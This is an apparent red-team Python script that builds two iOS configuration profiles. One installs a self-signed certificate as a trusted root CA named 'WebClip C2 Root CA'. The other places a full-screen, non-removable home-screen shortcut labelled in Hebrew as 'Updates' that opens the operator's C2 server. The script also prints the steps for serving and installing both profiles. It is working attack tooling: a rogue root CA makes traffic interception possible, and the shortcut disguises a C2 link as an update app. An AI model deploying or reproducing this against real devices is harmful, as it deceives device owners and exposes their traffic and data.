#!/usr/bin/env python3
"""
Usage: python3 scripts/gen-mobileconfig.py <SERVER_IP> [<PORT>]

Reads certs/cert.pem and outputs:
  dist/ca-trust.mobileconfig  — iOS trust profile for the self-signed cert
  dist/webclip.mobileconfig   — WebClip home screen shortcut

Install order on device:
  1. Open dist/ca-trust.mobileconfig  → Settings → Profile Downloaded → Install
  2. Open dist/webclip.mobileconfig   → Settings → Profile Downloaded → Install
  3. Settings → General → VPN & Device Management → trust the cert
"""
import sys, uuid, base64, os, subprocess
from pathlib import Path

ROOT = Path(__file__).parent.parent
CERTS_DIR = ROOT / "certs"
DIST_DIR  = ROOT / "dist"

def main():
    server_ip = sys.argv[1] if len(sys.argv) > 1 else None
    port      = int(sys.argv[2]) if len(sys.argv) > 2 else 8443

    if not server_ip:
        print("Usage: python3 scripts/gen-mobileconfig.py <SERVER_IP> [PORT]")
        sys.exit(1)

    cert_pem = CERTS_DIR / "cert.pem"
    if not cert_pem.exists():
        print(f"[!] {cert_pem} not found. Run scripts/gen-cert.sh first.")
        sys.exit(1)

    # Convert PEM to DER, base64 encode for mobileconfig payload
    der = subprocess.check_output(["openssl", "x509", "-outform", "DER", "-in", str(cert_pem)])
    cert_b64 = base64.b64encode(der).decode()

    DIST_DIR.mkdir(exist_ok=True)

    # --- CA Trust profile ---
    ca_uuid    = str(uuid.uuid4()).upper()
    cert_uuid  = str(uuid.uuid4()).upper()
    profile_uuid = str(uuid.uuid4()).upper()

    ca_mobileconfig = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>PayloadContent</key>
  <array>
    <dict>
      <key>PayloadCertificateFileName</key>
      <string>webclip-ca.cer</string>
      <key>PayloadContent</key>
      <data>{cert_b64}</data>
      <key>PayloadDescription</key>
      <string>Adds WebClip C2 root certificate</string>
      <key>PayloadDisplayName</key>
      <string>WebClip C2 Root CA</string>
      <key>PayloadIdentifier</key>
      <string>com.webclip.c2.cert.{cert_uuid.lower()}</string>
      <key>PayloadType</key>
      <string>com.apple.security.root</string>
      <key>PayloadUUID</key>
      <string>{cert_uuid}</string>
      <key>PayloadVersion</key>
      <integer>1</integer>
    </dict>
  </array>
  <key>PayloadDescription</key>
  <string>Trust profile for WebClip C2 server certificate</string>
  <key>PayloadDisplayName</key>
  <string>WebClip C2 Trust</string>
  <key>PayloadIdentifier</key>
  <string>com.webclip.c2.trust.{profile_uuid.lower()}</string>
  <key>PayloadOrganization</key>
  <string>Red Team</string>
  <key>PayloadRemovalDisallowed</key>
  <false/>
  <key>PayloadType</key>
  <string>Configuration</string>
  <key>PayloadUUID</key>
  <string>{profile_uuid}</string>
  <key>PayloadVersion</key>
  <integer>1</integer>
</dict>
</plist>"""

    # --- WebClip shortcut ---
    clip_uuid    = str(uuid.uuid4()).upper()
    clip_payload = str(uuid.uuid4()).upper()

    webclip_url = f"https://{server_ip}:{port}/"

    webclip_mobileconfig = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>PayloadContent</key>
  <array>
    <dict>
      <key>FullScreen</key>
      <true/>
      <key>IsRemovable</key>
      <false/>
      <key>Label</key>
      <string>עדכונים</string>
      <key>PayloadDescription</key>
      <string>WebClip shortcut</string>
      <key>PayloadDisplayName</key>
      <string>עדכונים</string>
      <key>PayloadIdentifier</key>
      <string>com.webclip.c2.clip.{clip_payload.lower()}</string>
      <key>PayloadType</key>
      <string>com.apple.webClip.managed</string>
      <key>PayloadUUID</key>
      <string>{clip_payload}</string>
      <key>PayloadVersion</key>
      <integer>1</integer>
      <key>Precomposed</key>
      <true/>
      <key>URL</key>
      <string>{webclip_url}</string>
    </dict>
  </array>
  <key>PayloadDescription</key>
  <string>Installs WebClip shortcut on home screen</string>
  <key>PayloadDisplayName</key>
  <string>עדכונים App</string>
  <key>PayloadIdentifier</key>
  <string>com.webclip.c2.clip.{clip_uuid.lower()}</string>
  <key>PayloadOrganization</key>
  <string>Red Team</string>
  <key>PayloadRemovalDisallowed</key>
  <false/>
  <key>PayloadType</key>
  <string>Configuration</string>
  <key>PayloadUUID</key>
  <string>{clip_uuid}</string>
  <key>PayloadVersion</key>
  <integer>1</integer>
</dict>
</plist>"""

    (DIST_DIR / "ca-trust.mobileconfig").write_text(ca_mobileconfig, encoding="utf-8")
    (DIST_DIR / "webclip.mobileconfig").write_text(webclip_mobileconfig, encoding="utf-8")

    print(f"[+] dist/ca-trust.mobileconfig  — install first on device")
    print(f"[+] dist/webclip.mobileconfig   — install second on device")
    print(f"[+] WebClip URL: {webclip_url}")
    print()
    print("Serve them with: python3 -m http.server 9999 --directory dist/")
    print("On device: open http://<SERVER_IP>:9999/ca-trust.mobileconfig")

if __name__ == "__main__":
    main()
